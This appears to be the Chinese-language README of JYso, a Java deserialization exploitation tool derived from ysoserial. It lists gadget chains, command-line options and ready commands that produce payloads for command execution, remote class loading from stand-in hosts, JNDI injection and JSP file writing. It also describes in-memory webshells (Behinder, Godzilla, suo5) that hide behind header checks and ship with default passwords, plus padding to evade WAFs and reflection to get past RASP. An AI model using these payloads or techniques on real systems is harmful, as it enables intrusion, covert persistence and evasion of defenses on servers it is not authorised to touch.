     CommonsBeanutilsAttrCompare183              @SummerSec                             commons-beanutils:1.8.3                                                                                                                                                             
     CommonsBeanutilsObjectToStringComparator    @水滴                                   commons-beanutils:1.9.2, commons-lang3:3.10                                                                                                                                       
     CommonsBeanutilsObjectToStringComparator183 @SummerSec                             commons-beanutils:1.8.3, commons-lang3:3.10                                                                                                                                         
     CommonsBeanutilsPropertySource              @SummerSec                             commons-beanutils:1.9.2, log4j-core:2.17.1                                                                                                                                          
     CommonsBeanutilsPropertySource183           @SummerSec                             commons-beanutils:1.9.2, log4j-core:2.17.1                                                                                                                                          
     CommonsCollections1                         @frohoff                               commons-collections:3.1                                                                                                                                                             
     CommonsCollections10                                                               commons-collections:3.2.1                                                                                                                                                           
     CommonsCollections11                                                                                                                                                                                                                                                   
     CommonsCollections12                                                               commons-collections:3.2.1                                                                                                                                                           
     CommonsCollections2                         @frohoff                               commons-collections4:4.0                                                                                                                                                            
     CommonsCollections3                         @frohoff                               commons-collections:3.1                                                                                                                                                             
     CommonsCollections4                         @frohoff                               commons-collections4:4.0                                                                                                                                                            
     CommonsCollections5                         @matthias_kaiser, @jasinner            commons-collections:3.1                                                                                                                                                             
     CommonsCollections6                         @matthias_kaiser                       commons-collections:3.1                                                                                                                                                             
     CommonsCollections7                         @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                                                                                                             
     CommonsCollections8                         @navalorenzo                           commons-collections4:4.0                                                                                                                                                            
     CommonsCollections9                         @梅子酒                                 commons-collections:3.2.1                                                                                                                                                        
     CommonsCollectionsK1                                                               commons-collections:3.1                                                                                                                                                             
     CommonsCollectionsK1Jdbc                                                                                                                                                                                                                                               
     CommonsCollectionsK2                                                               commons-collections:4.0                                                                                                                                                             
     CommonsCollectionsK3                        @matthias_kaiser                       commons-collections:3.1                                                                                                                                                             
     CommonsCollectionsK4                        @matthias_kaiser                       commons-collections:4.0                                                                                                                                                             
     CommonsCollectionsK5                                                               commons-collections:4.0                                                                                                                                                             
     CommonsCollectionsK6                                                               commons-collections:4.0                                                                                                                                                             
     Fastjson1                                                                                                                                                                                                                                                              
     Fastjson2                                                                                                                                                                                                                                                              
     Groovy1                                     @frohoff                               groovy:2.3.9                                                                                                                                                                        
     Hibernate1                                  @mbechler                              hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1                                                                     
     Hibernate2                                  @mbechler                              hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1                                                                     
     JBossInterceptors1                          @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                            
     JRE8u20                                     @frohoff                                                                                                                                                                                                                   
     JRE8u20_2                                                                                                                                                                                                                                                              
     JRMPClient                                  @mbechler                                                                                                                                                                                                                  
     JRMPClient_Activator                        @mbechler                                                                                                                                                                                                                  
     JRMPClient_Obj                              @mbechler                                                                                                                                                                                                                  
     JRMPListener                                @mbechler                                                                                                                                                                                                                  
     JSON1                                       @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     Jackson                                                                                                                                                                                                                                                                
     JacksonLdapAttr                                                                                                                                                                                                                                                        
     JavassistWeld1                              @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                        
     Jdk7u21                                     @frohoff                                                                                                                                                                                                                   
     Jdk7u21variant                              @potats0                                                                                                                                                                                                                   
     Jython1                                     @pwntester, @cschneider4711            jython-standalone:2.5.2                                                                                                                                                             
     MozillaRhino1                               @matthias_kaiser                       js:1.7R2                                                                                                                                                                            
     MozillaRhino2                               @_tint0                                js:1.7R2                                                                                                                                                                            
     Myfaces1                                    @mbechler                                                                                                                                                                                                                  
     Myfaces2                                                                                                                                                                                                                                                               
     ROME                                        @mbechler                              rome:1.0                                                                                                                                                                            
     ROME2                                                                              rome:1.0                                                                                                                                                                            
     RenderedImage                                                                      jai-codec-1.1.3                                                                                                                                                                     
     SignedObject                                                                                                                                                                                                                                                           
     Spring1                                     @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                               
     Spring2                                     @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                           
     Spring3                                                                            spring-tx:5.2.3.RELEASE, spring-context:5.2.3.RELEASE, javax.transaction-api:1.2                                                                                                    
     URLDNS                                      @gebl                                                                                                                                                                                                                      
     Vaadin1                                     @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                          
     Wicket1                                     @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4                                                                                                                                                 



usage: JYso-[version].jar [-ch <arg>] [-dcfp <arg>] [-dl <arg>] [-dt <arg>] [-f <arg>] [-g <arg>] [-gen] [-gzk <arg>] [-h] [-hk <arg>] [-ht <arg>] [-hv <arg>] [-i] [-mcl] [-n <arg>] [-ncs] [-o] [-p
       <arg>] [-pw <arg>] [-rh] [-u <arg>] [-yso <arg>]
 -ch,--cmd-header <arg>                      请求头，将命令传递给执行，默认[X-Token-Data]
 -dcfp,--define-class-from-parameter <arg>   使用 DefineClassFromParameter 时自定义参数名称
 -dl,--dirty-length <arg>                    使用类型 1 或 3 时的脏数据长度/使用类型 2 时的嵌套循环计数
 -dt,--dirty-type <arg>                      利用脏数据绕过WAF，类型：1:Random Hashable Collections/2:LinkedList Nesting/3:Serialized Data中的TC_RESET
 -f,--file <arg>                             将输出写入 FileOutputStream（指定文件名）
 -g,--gadget <arg>                           Java deserialization gadget
 -gen,--gen-mem-shell                        将内存 Shell 类写入文件
 -gzk,--godzilla-key <arg>                   Godzilla key,default [key]
 -h,--hide-mem-shell                         对检测工具隐藏内存外壳（类型2仅支持SpringControllerMS）
 -hk,--header-key <arg>                      MemoryShell 标头检查，请求标头密钥，默认 [Referer]
 -ht,--hide-type <arg>                       隐藏内存shell，输入1：write /jre/lib/charsets.jar 2：write /jre/classes/
 -hv,--header-value <arg>                    MemoryShell 标头检查,请求标头值,默认 [https://www.baidu.com/]
 -i,--inherit                                是否让payload继承AbstractTranslet（低版本的JDK如1.6应该继承）
 -mcl,--mozilla-class-loader                 在 TransformerUtil 中使用 org.mozilla.javascript.DefiningClassLoader
 -n,--gen-mem-shell-name <arg>               内存外壳类文件名
 -ncs,--no-com-sun                           强制使用 org.apache.XXX.TemplatesImpl 而不是 com.sun.org.apache.XXX.TemplatesImpl
 -o,--obscure                                使用反射绕过RASP
 -p,--parameters <arg>                       Gadget parameters
 -pw,--password <arg>                        Behinder 或 Godzilla 密码，默认 [p@ssw0rd]
 -rh,--rhino                                 使用Rhino Engine 把内存马代码转换为JS
 -u,--url <arg>                              MemoryShell绑定url模式，默认[/sysinfo]
 -utf,--utf8-Overlong-Encoding               UTF-8 Overlong Encoding Bypass waf
 -yso,--ysoserial <arg>                      Java deserialization


Recommended Usage: -yso -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i -f evil.ser
If you want your payload being extremely short，you could just use:
java -jar JYso-[version].jar -yso 1 -g [payload] -p '[command]' -i -f evil.ser
```

## 2.1 利用方式

在原版的利用方式中，对于使用 TemplatesImpl 的利用方式，仅使用了单一的 `java.lang.Runtime.getRuntime().exec()` 执行任意命令；对于使用 ChainedTransformer
的利用方式，也是仅 chain 了一个 Runtime exec，再漏洞利用上过于局限且单一，因此本项目在原版项目基础上扩展了不同的利用方式以供在实战环境中根据情况选择。

## 2.2 针对 TemplatesImpl

原版仅使用了 Runtime 的命令执行方式，这里对其进行深度的扩展，并植入了多种内存马的功能。

## 2.3 扩展攻击-内存马及回显

如果使用这些利用链进行攻击，本项目内置了一些高级扩展用法，命令均使用 `EX-` 开头，包括内存马、命令执行回显等，具体如下：

命令执行回显：

- 命令 `EX-AllEcho`：DFS 找 Request 命令执行回显
- 命令 `EX-TomcatEcho`：Tomcat 命令执行回显
- 命令 `EX-SpringEcho`：Spring 命令执行回显
- 命令 `EX-JbossEcho`：Jboss 命令执行回显
- 命令 `EX-jettyEcho`：Jetty 命令执行回显
- 命令 `EX-LinuxEcho1`：Linux 命令执行回显
- 命令 `EX-LinuxEcho2`：Linux 命令执行回显
- 命令 `EX-resinEcho`：Resin 命令执行回显
- 命令 `EX-weblogicEcho`：Weblogic 命令执行回显
- 命令 `EX-WindowsEcho`：Windows 命令执行回显

解决 Shiro Header 头部过长问题：

- 命令 `EX-DefineClassFromParameter`：从 request 中获取指定参数的值进行类加载

内存马：

- 命令 `EX-MS-SpringInterceptorMS-...`：向系统内植入 Spring 拦截器类型的内存马
- 命令 `EX-MS-SpringControllerMS-...`：向系统内植入 Spring Controller 类型的内存马
- 命令 `EX-MS-SpringWebfluxMS-...`：向系统内植入 Spring WebFilter 类型的内存马（仅支持 gz 及 cmd）
- 命令 `EX-MS-TSMSFromJMXF`：利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马
- 命令 `EX-MS-TSMSFromJMXS-...`：利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
- 命令 `EX-MS-TLMSFromJMXLi-...`：利用 JMX MBeans 向系统内植入 Tomcat Listener 型内存马
- 命令 `EX-MS-JFMSFromJMXF-...`：利用 JMX MBeans 向系统内植入 Jetty Filter 型内存马
- 命令 `EX-MS-JFMSFromJMXS-...`：利用 JMX MBeans 向系统内植入 Jetty Servlet 型内存马
- 命令 `EX-MS-TFMSFromRequestF-...`：通过在线程组中找 Request 向系统内植入 Tomcat Filter 型内存马
- 命令 `EX-MS-TSMSFromRequestS-...`：通过在线程组中找 Request 向系统内植入 Tomcat Servlet 型内存马
- 命令 `EX-MS-TFMSFromThreadF-...`：通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
- 命令 `EX-MS-TFMSFromThreadLi-...`：通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马
- 命令 `EX-MS-TFMSFromThreadS-...`：通过线程类加载器获取指定上下文向系统内植入 Tomcat Servlet 型内存马
- 命令 `EX-MS-JBFMSFromContextF-...`：通过全局上下文向系统内植入 JBoss/Wildfly Filter 型内存马
- 命令 `EX-MS-JBFMSFromContextS-...`：通过全局上下文向系统内植入 JBoss/Wildfly Servlet 型内存马
- 命令 `EX-MS-RFMSFromThreadF-...`：通过线程类加载器获取指定上下文系统内植入 Resin Filter 型内存马
- 命令 `EX-MS-RFMSFromThreadS-...`：通过线程类加载器获取指定上下文系统内植入 Resin Servlet 型内存马
- 命令 `EX-MS-WSFMSFromThread-...`：通过线程类加载器获取指定上下文系统内植入 Websphere Filter 型内存马
- 命令 `EX-MS-RMIBindTemplate-...`：RMI 型内存马

目前支持的直打内存马的类型包括 Tomcat、Jetty、JBoss/Wildfly、Websphere、Resin、Spring。

并可以通过关键字指定内存马的类型，如冰蝎内存马、哥斯拉 Base64 内存马、哥斯拉 RAW 内存马、CMD 命令回显马等，使用方法例子如下：

- `EX-MS-TSMSFromThread-bx`：`冰蝎` 逻辑内存马
- `EX-MS-TSMSFromThread-gz`：`哥斯拉` Base64 逻辑内存马
- `EX-MS-TSMSFromThread-gzraw`：`哥斯拉` RAW 逻辑内存马
- `EX-MS-TSMSFromThread-cmd`：`CMD` 命令回显内存马
- `EX-MS-TSMSFromThread-suo5`：`suo5` suo5 隧道马

另外还本项目目前支持了 Tocmat WebSocket、Upgrade 以及 Executor 命令执行内存马，暂未扩展成多种类型（因为相关工具不支持，需魔改），使用方法例子如下：

- `EX-MS-TWSMSFromThread` : `CMD` 命令回显 WebSocket 内存马
- `EX-MS-TEXMSFromThread` : `CMD` 命令回显 Executor 内存马
- `EX-MS-TUGMSFromJMXuP` : `CMD` 命令回显 Upgrade 内存马
- `EX-cmsMSBYNC`: 绕过Nginx、CDN代理限制的 WebSocket 马，路径`/x`
- `EX-proxyMSBYNC`: 绕过Nginx、CDN代理限制的 WebSocket 马，路径`/x`
- `EX-WsResin`: 适配 Resin 的 WebSocket 马，请求头中`Upgrade: websocket`
- `EX-MsTSJser`: 适配Tomcat、Spring、Jetty的 WebSocket 马，路径`/cmd`
- `EX-MsTSJproxy`: 适配Tomcat、Spring、Jetty的 WebSocket 马，路径`/proxy`
- `EX-WsWeblogic`: 适配 Weblogic 的 WebSocket 马，路径`/path`
- `EX-WSWebsphereProxy`: 适配 Websphere 的 WebSocket 马，路径`/path`

对于一些非常规的环境，本项目还提供了基于 Java 原生的 RMI 内存马及命令回显方式，通过向 RMI 注册中心绑定一个恶意类，可以随时调用执行命令并回显，使用方法例子如下：

- `EX-MS-RMIBindTemplate-1100-qi4l`: `CMD` 命令回显 RMI 内存马

无文件落地的 Agent 型内存马，通过修改系统关键类字节码，植入内存马，无任何文件落地，全程在内存操作，能绕过多种防护和检测，使用方式 `EX-Agent-Lin/Win-Filter/Servlet-bx/gzraw/gz/cmd`，目前区分 Win/Lin 操作系统，并支持了 Servlet、Tomcat Filter 型内存马，将会持续更新一些 Hook 点，使用方式例如：

- `EX-Agent-Lin-Filter-bx`：在 Linux 系统上对 Tomcat Filter 修改类字节码的冰蝎 Agent 型内存马

本工具支持的全部内存马经过测试可用，但实际受到中间件版本的限制，对于内存马的相关测试，可以参考项目 [https://github.com/su18/MemoryShell](https://github.com/su18/MemoryShell)

## 2.4 针对 ChainedTransformer

- CommonsCollections1
- CommonsCollections5
- CommonsCollections6
- CommonsCollections7
- CommonsCollections9
- CommonsCollectionsK3
- CommonsCollectionsK4
- commonscollectionsK5

本项目为其拓展了除了 Runtime 执行命令意外的多种利用方式，具体如下：

- TS ：Thread Sleep - 通过 `Thread.sleep()` 的方式来检查是否存在反序列化漏洞，使用命令：`TS-10`
- RC ：Remote Call - 通过 `URLClassLoader.loadClass()` 来调用远程恶意类并初始化，使用命令：`RC-http://xxxx.com/evil.jar#EvilClass`
- WF ：Write File - 通过 `FileOutputStream.write()` 来写入文件，使用命令：`WF-/tmp/shell#d2hvYW1p`
- PB ：ProcessBuilder 通过 `ProcessBuilder.start()` 来执行系统命令，使用命令 `PB-lin-d2hvYW1p` / `PB-win-d2hvYW1p`分别在不同操作系统执行命令
- SE ：ScriptEngine - 通过 `ScriptEngineManager.getEngineByName('js').eval()` 来解析 JS 代码调用 Runtime 执行命令，使用命令 `SE-d2hvYW1`
- DL ：DNS LOG - 通过 `InetAddress.getAllByName()` 来触发 DNS 解析，使用命令 `DL-xxxdnslog.cn`
- HL ：HTTP LOG - 通过 `URL.getContent()` 来触发 HTTP LOG，使用命令 `HL-http://xxx.com`
- BC ：BCEL Classloader - 通过 `..bcel...ClassLoader.loadClass().newInstance()` 来加载 BCEL 类字节码，使用命令 `BC-$BCEL$xxx`，也可以使用 `BC-EX-TomcatEcho` 或 `BC-LF-/tmp/aaa.class` 来执行高级功能
- JD ：JNDI Lookup - 通过 `InitialContext.lookup()` 来触发 JNDI 注入，使用命令 `JD-ldap://xxx/xx`
- 其他：普通命令执行 - 通过 `Runtime.getRuntime().exec()` 执行系统命令，使用命令 `whoami`

这里需要注意的是，使用 PB 执行系统命令、WF 写入文件的内容、SE 执行命令时，为了防止传参错误，需要<font color="purple">对传入的命令使用
base64 编码</font>。

除了上面的利用，项目也通过 ScriptEngineManager 执行 JS 的方式支持了 `EX-` 的写法，也就是说针对 ChainedTransformer 利用方式也可以打入内存马或回显。

**命令执行示例**：

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections1 -p PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
```

**DNSLOG示例**：

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections1 -p 'DL-xxx.org'
```

**脚本引擎解析 JS 代码示例**：

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections1 -p 'SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
```

**文件写入示例**：

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections1 -p 'WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....'
```

**触发 JNDI 查询注入示例**：

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections1 -p 'JD-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
```

**普通命令执行示例**：

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections1 -p 'open -a Calculator.app'
```

### 2.4.1 任意自定义代码

如果你不想使用本项目中提供的恶意逻辑，也不想执行命令，可以通过自定义代码的形式，自定义代码将会在目标服务器通过 ClassLoader

[//]: # (进行加载并实例化。命令使用 `LF-` 开头，后面跟指定自定义类字节码文件的绝对路径，程序会尝试自动缩减类字节码的大小。)

示例：

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections3 -p LF-/tmp/evil.class
```

### 2.4.2 普通命令执行

最后是普通的执行命令，直接输入待执行的命令即可。

**普通命令执行示例**：

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsBeanutils2 -p 'open -a Calculator.app'
```

### 2.4.3 URLDNS 探测目标类

为了解决有反序列化利用点但是无链可用的状态，本项目提供了基于 URLDNS 探测目标类的功能。这条链会根据目标环境中不同的类是否存在来判断系统环境、依赖版本，主要包含如下表格中的内容：

| DNSLOG 关键字                               | 对应链                  | 关键类                                                       | 备注                                                         |
| ------------------------------------------- | ----------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| cc31or321<br />cc322                        | CommonsCollections13567 | org.apache.commons.collections.functors.ChainedTransformer<br />org.apache.commons.collections.ExtendedProperties$1 | CommonsCollections1/3/5/6/7<br />需要<=3.2.1版本             |
| cc40<br />cc41                              | CommonsCollections24    | org.apache.commons.collections4.functors.ChainedTransformer<br />org.apache.commons.collections4.FluentIterable | CommonsCollections2/4链<br />需要4-4.0版本                   |
| cb17<br />cb18x<br />cb19x                  | CommonsBeanutils2       | org.apache.commons.beanutils.MappedPropertyDescriptor\$1<br />org.apache.commons.beanutils.DynaBeanMapDecorator\$MapEntry<br />org.apache.commons.beanutils.BeanIntrospectionData | 1.7x-1.8x为-3490850999041592962<br />1.9x为-2044202215314119608 |
| c3p092x<br />c3p095x                        | C3P0                    | com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase<br />com.mchange.v2.c3p0.test.AlwaysFailDataSource | 0.9.2pre2-0.9.5pre8为7387108436934414104<br />0.9.5pre9-0.9.5.5为7387108436934414104 |
| ajw                                         | AspectJWeaver           | org.aspectj.weaver.tools.cache.SimpleCache                   | AspectJWeaver,需要cc31                                       |
| bsh20b4<br />bsh20b5<br />bsh20b6           | bsh                     | bsh.CollectionManager\$1<br />bsh.engine.BshScriptEngine<br />bsh.collection.CollectionIterator\$1 | 2.0b4为4949939576606791809<br />2.0b5为4041428789013517368<br />2.0.b6无法反序列化 |
| groovy1702311<br />groovy24x<br />groovy244 | Groovy                  | org.codehaus.groovy.reflection.ClassInfo\$ClassInfoSet<br />groovy.lang.Tuple2<br />org.codehaus.groovy.runtime.dgm\$1170 | 2.4.x为-8137949907733646644<br />2.3.x为1228988487386910280  |
| becl                                        | Becl                    | com.sun.org.apache.bcel.internal.util.ClassLoader            | JDK<8u251                                                    |
| Jdk7u21                                     | Jdk7u21                 | com.sun.corba.se.impl.orbutil.ORBClassLoader                 | JDK<=7u21                                                    |
| JRE8u20                                     | JRE8u20                 | javax.swing.plaf.metal.MetalFileChooserUI\$DirectoryComboBoxModel\$1 | 7u25<=JDK<=8u20<br />这个检测不完美,8u25版本以及JDK<=7u21会误报<br />可综合Jdk7u21来看 |
| linux<br />windows                          | winlinux                | sun.awt.X11.AwtGraphicsConfigData<br />sun.awt.windows.WButtonPeer | windows/linux版本判断                                        |
| jackson2100                                 | jackson                 | com.fasterxml.jackson.databind.node.NodeSerialization        |                                                              |
| ROME                                        | ROME                    | com.sun.syndication.feed.impl.ToStringBean<br />com.rometools.rome.feed.impl.ObjectBean |                                                              |
| SpringAOP                                   | fastjon<br /> jackson   | org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource |                                                              |
| fastjson                                    | fastjon                 | com.alibaba.fastjson.JSONArray                               |                                                              |
|                                             | all                     |                                                              | 全部检测                                                     |

本项目参考了 kezibei 师傅的 URLDNS 项目，实际情况可能有如下几种情况导致问题：

- 反序列时遇到黑名单，可能导致后面的类的 dnslog 出不来；
- 反序列化流程中由于种种情况报错可能导致出不来。

因此这里还是提供了 all/common/指定类 三种探测方式：

- all：探测全部的类；
- common：探测不常在黑名单中的 CommonsBeanutils2/C3P0/AspectJWeaver/bsh/winlinux；
- 指定类：使用对应链中的关键字 CommonsCollections24:xxxx.dns.log 。

示例：`all:xxxxxx.dns.log`

```shell
java -jar JYso-[version].jar -yso 1 -g URLDNS -p 'all:xxxxxx.dns.log'
```

### 2.4.4 其他利用链的拓展

对于 BeanShell1 及 Clojure 这两个基于脚本语言解析的漏利用方式。

本项目为这两条利用链拓展了除了 Runtime 执行命令意外的多种利用方式，具体如下：

- TS ：Thread Sleep - 通过 `Thread.sleep()` 的方式来检查是否存在反序列化漏洞，使用命令：`TS-10`
- RC ：Remote Call - 通过 `URLClassLoader.loadClass()` 来调用远程恶意类并初始化，使用命令：`RC-http://xxxx.com/evil.jar#EvilClass`
- WF ：Write File - 通过 `FileOutputStream.write()` 来写入文件，使用命令：`WF-/tmp/shell#123`
- 其他：普通命令执行 - 通过 `ProcessBuilder().start()` 执行系统命令，使用命令 `whoami`

与之前的扩展类似，这里也不放截图了。

对于 BeanShell1，还通过 ScriptEngineManager 执行 JS 的方式支持回显或内存马的打入。使用方式同上：`EX-`

### 2.4.5 MSF/CS 上线

使用 MSF 的上线载荷配合远程 Jar 包调用完成 MSF 上线，后续可转 CS。

## 2.5 内存马的使用

针对项目中一键打入的各种内存马，这里提供了通用的利用方式。

### 2.5.1 命令执行及后门类

对于植入的内存马及恶意逻辑，首先为了隐藏内存马，通过逻辑进行了判断，需要在请求 Header 中添加 `Referer: https://QI4L.cn/ `，其次执行不同的逻辑：
这个校验的 header 头部和值可以通过 `-hk "Referer" -hv "https://QI4L.cn/"` 来进行自定义指定。

1. 如果是 <font color="orange">CMD</font> 内存马，程序会从 `X-Token-Data` 中读取待执行的命令，并将执行结果进行回显，这个头部可以通过 `-ch "testecho"` 来指定。

2. 如果是 <font color="orange">冰蝎 Shell</font> 内存马，可使用冰蝎客户端进行连接管理，密码 `p@ssw0rd`, 可以通过 `-pw "1qaz@WSX"` 来指定。

3. 如果是 <font color="orange">哥斯拉 shell</font> 内存马，可使用哥斯拉客户端进行连接管理，pass 值设为 `p@ssw0rd`，key 设为 `key`，哥斯拉内存马同时支持了 RAW 和 Base64,可以通过 `-pw "1qaz@WSX" -gzk "evilkey"` 来指定。

4. 如果是 <font color="orange"> suo5 </font> 内存马，则会直接创建一个 suo5 隧道，可以直接由 suo5 客户端进行连接，suo5 目前对支持了对自定义 Header 头部进行鉴权，生成时可以通过参数 `-hk "User-Agent" -hv "aaaawww"` 指定，如下可正常连接：

   在配置中进行配置。

   项目地址：[https://github.com/zema1/suo5](https://github.com/zema1/suo5)，此项目还在积极更新中，会不定期更新相关代码支持相关功能。

5. 如果是 <font color="orange"> WebSocket </font> 内存马，可使用 WebSocket 客户端进行链接，路径为 `/version.txt`，可以使用 `-u "/aaa"` 来指定。

6. 如果是 <font color="orange"> Tomcat Executor </font> 内存马，程序会从 Header 中的 `X-Token-Data` 中读取待执行的命令，并将执行结果在 Header `Server-token` 进行 Base64encode 回显，可以使用 `-ch "testecho"` 来指定。

7. 如果是 <font color="orange"> Tomcat Upgrade </font> 内存马，需要指定 `Connection: Upgrade` 以及 `Upgrade: version.txt`，程序会从 Header 中的 `X-Token-Data` 中读取待执行的命令，并将结果放回 response 中回显，可以使用 `-u "/aaa" -ch "testecho"` 来指定。

### 2.5.2 Echo 类

对于 Echo 类的回显，是基于在线程组中找到带有指定 Header 头部的请求、执行命令并回显的利用方式。

使用时在 Header 中加入 `X-Token-Data` ，其值为待执行的命令，命令执行结果将回显在 response 中。

### 2.5.3 RMI 内存马

对于 RMIBindTemplate
是在目标服务器上的指定端口启动注册中心（如果没有），并向其中绑定恶意的后门类，配合 `exploit.org.qi.ysuserial.RMIBindExploit`
进行命令执行

## 2.6 防御的绕过

这部分不涉及使用方式，只是简单的描述一下项目中所使用的绕过方式供大家了解。

## 2.7 流量层面

对于冰蝎和哥斯拉，他们自己在流量和Java层都有很多可以提取的特征，这里没有办法去管控，需要各位自行去魔改，其实也并不难。本项目把一些大家实现的比较类似的一些特征进行了去除。

在一些情况下，流量层的 WAF 会在对流量数据包解析时对关键字、关键特征进行匹配，例如反序列化流量包中出现的一些关键类的包名、类名，但是流量设备受限于性能影响，不会无限制的解析请求包，可能会影响到实际业务，因此一般会有解析的`时间`
上或`长度`上的阈值，超过该阈值，将放弃检查。

因此本项目添加了为反序列化数据添加脏数据用来绕过流量层面的 WAF 的功能，在生成反序列化数据时，指定 -dt 参数，即可根据不同类型生成封装后的带有随机脏字符的反序列化数据包。

例如：

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsBeanutils1 -p 'EX-MS-TEXMSFromThread' -dt 1 -dl 50000
```

可以生成填充了 50000 个脏字符的序列化数据

## 2.8 RASP 层面

对于漏洞执行常使用的 Runtime、URLClassLoader 等，很多 RASP 都进行了 Hook，在攻击时可能会被拦截，这里我使用了一些反射调用 native 方法之类的技术去尝试 RASP
的防御，具体的技术实现就不细说了，感兴趣的朋友可以反编译 jar 包查看相关代码。 可以使用 -o 参数指定使用绕过 RASP 的相关技术。

目前已支持动态生成混淆的类名，不存在任何 `qi4l` 关键字。

## 2.9 Exploit

除了单独的参数外，其余参数与 payload 的参数保持一致

- JBoss
- JenkinsCLI
- JenkinsListener
- JenkinsReverse
- JMXInvokeMBean
- JRMPClassLoadingListener
- JRMPClient
- JRMPListener
- JSF
- RMIBindExploit

```
java -cp JYso-[version].jar -yso 1 com.qi4l.jndi.exploit.JRMPListener 8888 -g CommonsCollections1 -p whoami
```

## 3.0 Springboot版本

在jacksonjdk17链中，增加springboot版本参数,-springboot3 true则使用3版本默认为2
```
java -jar JYso-3.5.7.jar -yso 1  -g JacksonJdk17 -p "open -a Calculator" -f dns.ser -springboot3 true
```